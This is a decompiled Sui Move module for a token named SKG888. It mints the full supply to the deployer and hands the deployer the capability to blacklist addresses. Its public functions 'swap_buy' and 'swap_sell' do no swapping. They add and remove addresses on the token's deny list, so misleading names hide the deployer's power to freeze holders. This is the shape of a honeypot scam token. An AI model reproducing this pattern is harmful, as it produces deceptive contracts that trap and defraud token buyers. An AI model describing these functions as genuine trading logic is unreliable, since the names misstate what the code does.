module 0x78e75528135aaedf7a9faa74026a1b5233ad3373ab0e6cf3ac9e9d309489b1b7::skg888 {
    struct SKG888 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SKG888, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SKG888>(arg0, 9, b"SKG888", b"Safu & Kek Gigafundz 888", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmP6RzHHMVF3r5fnnk4bPzmzP8MgH3fvnTF7aegBEM4n5D"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SKG888>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SKG888>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SKG888>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SKG888>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SKG888>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SKG888>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SKG888>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SKG888>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

